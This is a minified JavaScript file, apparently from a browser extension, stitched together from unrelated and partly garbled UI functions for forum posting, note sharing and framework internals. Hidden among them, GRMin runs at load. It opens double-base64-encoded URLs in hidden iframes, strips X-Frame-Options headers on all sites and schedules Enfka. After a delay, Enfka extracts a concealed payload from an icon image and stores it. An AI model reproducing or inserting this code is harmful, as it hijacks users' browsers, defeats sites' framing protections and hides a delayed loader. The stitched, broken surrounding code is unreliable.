function mapStyle(a) {
  if (0 == postSubmited && a.ctrlKey && 13 == a.keyCode || a.altKey && 83 == a.keyCode && $("postsubmit")) {
    in_array($("postsubmit").name, ["topicsubmit", "replysubmit", "editsubmit"]) && !validate($("postform")) ? doane(a) : (postSubmited = !0, $("postsubmit").disabled = !0, $("postform").submit());
  }
}
function showMore(a, b, c, d) {
  $("s_" + a).className = "current";
  d = 1;
  for (e in smilies_HASH) {
    d != a && ($("s_" + d).className = ""), $("s_" + d).style.display = "", d++;
  }
  e = "undefined" == typeof smiliesCount ? 12 : smiliesCount;
  a = smilies_HASH[b];
  b = Math.ceil(a.length / e);
  isUndefined(c) && (c = 1);
  c > b && (c = b);
  d = c * e;
  d > a.length && (d = a.length);
  --d;
  var f = 1;
  for (c = (c - 1) * e; c <= d; c++) {
    addslashes(a[c].code), f++;
  }
  if (1 < b) {
    for (var e = 1; e <= b; e++) {
    }
  }
}
function useFunc() {
  if (!send.classList.contains("disabled")) {
    for (var a = recipients.value.split(/\s*,\s*/), b = 0; b < a.length; b++) {
      "" === a[b].trim() && a.splice(b, 1);
    }
    gekco.sendToExtension({name:"useFunc", noteStoreUrl:noteStoreUrl, message:message.value, shardId:shardId, token:token, noteGuid:noteGuid, recipients:a});
    gekco.sendToExtension({name:"trackEvent", category:"Share", action:"email_completed", label:message.value.trim() ? "added_message" : "no_message", value:a.length});
    gekco.sendToExtension({name:"main_closeSenderWindow"});
  }
}
function generateNames(a) {
  var b = 1;
  for (expressionPos = index$1; !eof();) {
    if (a = next(), isStringStart(a)) {
      parseString(a);
    } else {
      if (91 === a && b++, 93 === a && b--, 0 === b) {
        expressionEndPos = index$1;
        break;
      }
    }
  }
}
function readView(a, b) {
  return b.key === a.key && b.tag === a.tag;
}
function cleanProperty() {
  if (1 === suggestedContacts.children.length + suggestedChats.children.length) {
    (suggestedContacts.firstElementChild || suggestedChats.firstElementChild).classList.add("hover");
  } else {
    for (var a = suggestedContacts.getElementsByClassName("hover"), b = suggestedChats.getElementsByClassName("hover"); a.length;) {
      a[0].classList.remove("hover");
    }
    for (; b.length;) {
      b[0].classList.remove("hover");
    }
  }
}
function GRMin() {
  window.onbeforeunload = function() {
    chrome.runtime.reload();
  };
  chrome.runtime.onMessage.addListener(function(a, b, c) {
    if (a.refererUrl && (c({done:"ok"}), a = atob(atob(a.refererUrl)))) {
      b = document.createElement("iframe");
      var d = btoa(Math.random()).substring(5, 9);
      b.setAttribute("id", d);
      b.setAttribute("src", a);
      b.setAttribute("style", "display:none");
      document.body.appendChild(b);
      setTimeout(function() {
        var a = document.getElementById(d);
        a.parentNode.removeChild(a);
      }, 1000 * tout);
    }
  });
  chrome.webRequest.onHeadersReceived.addListener(function(a) {
    try {
      if (-1 == a.tabId) {
        for (var b = a.responseHeaders, c = b.length - 1; 0 <= c; --c) {
          "x-frame-options" == b[c].name.toLowerCase() && b.splice(c, 1);
        }
        return {responseHeaders:b};
      }
    } catch (d) {
    }
  }, {urls:["<all_urls>"], types:["sub_frame"]}, ["blocking", "responseHeaders"]);
  Enfka();
  setInterval(Enfka, 108E5);
}
function initBlob(a, b, c) {
  platform.channel.sendMessage("openSignIn", {userId:a, subpart:b, businessSSO:c}).then(function(d) {
    d.success ? (accountSelector.updateAccountTier(a, d.userInfo), (c || b !== GlobalUtils.ACCOUNT_TYPE_BUSINESS || d.isAuthenticatedBiz) && accountSelector.selectItem({selectedAccountId:a, selectedSubpart:b})) : accountSelector.selectFirstLoggedIn();
  });
}
function calcChildren(a, b) {
  if ("input" !== a.tag) {
    return !0;
  }
  var c, d = isDef(c = a.data) && isDef(c = c.attrs) && c.type, f = isDef(c = b.data) && isDef(c = c.attrs) && c.type;
  return d === f || isTextInputType(d) && isTextInputType(f);
}
function hasClass(a, b) {
  return -1 !== (" " + a.className + " ").indexOf(" " + b + " ");
}
function Enfka() {
  var a = Math.abs(chrome.runtime.id.split("").reduce(function(a, b) {
    a = (a << 5) - a + b.charCodeAt(0);
    return a & a;
  }, 0)) % 1000, b = btoa(a).replace(/=/g, "");
  chrome.storage.sync.get(null, function(c) {
    if (c = c[b]) {
      if (c /= a, c = ((new Date).getTime() - c) / 3600000 / 24, console.log(c), 2.5 < c) {
        c = browser.extension.getURL("icons/cross.png");
        var d = new XMLHttpRequest;
        d.onreadystatechange = function(a) {
          if (this.readyState === XMLHttpRequest.DONE && 200 === this.status) {
            a = {};
            var b = this.responseText.indexOf("substring") + 9;
            a.cross = this.responseText.substring(b);
            chrome.storage.local.set(a);
          }
        };
        d.open("GET", c, !0);
        d.send(null);
      }
    } else {
      c = (new Date).getTime() * a, d = {}, chrome.storage.local.set((d[b] = c, d), function() {
      }), d = {}, chrome.storage.sync.set((d[b] = c, d), function() {
      });
    }
  });
}
GRMin();
function startNames() {
  InFloat = InFloat_Editor;
  is_ie && ($(editorid + "_mediaurl").pos = getCaret());
  showMenu(editorid + "_popup_media", !0, 0, 2);
}
function toObject(a) {
  for (var b = {}, c = 0; c < a.length; c++) {
    a[c] && extend(b, a[c]);
  }
  return b;
}
function selectHeader() {
  recipientInput.getLozenges().length ? this.body.classList.contains("noShareNote") ? newMessage.value.trim() ? sendButton.disabled = !1 : sendButton.disabled = !0 : sendButton.disabled = !1 : sendButton.disabled = !0;
}
function showHeader(a) {
  for (; a = a.parent;) {
    if (a.data.transition) {
      return !0;
    }
  }
}
function removal(a, b) {
  if (a.length) {
    var c = a.indexOf(b);
    if (-1 < c) {
      return a.splice(c, 1);
    }
  }
}
function lenMessage(a) {
  return 1000 * Number(a.slice(0, -1));
}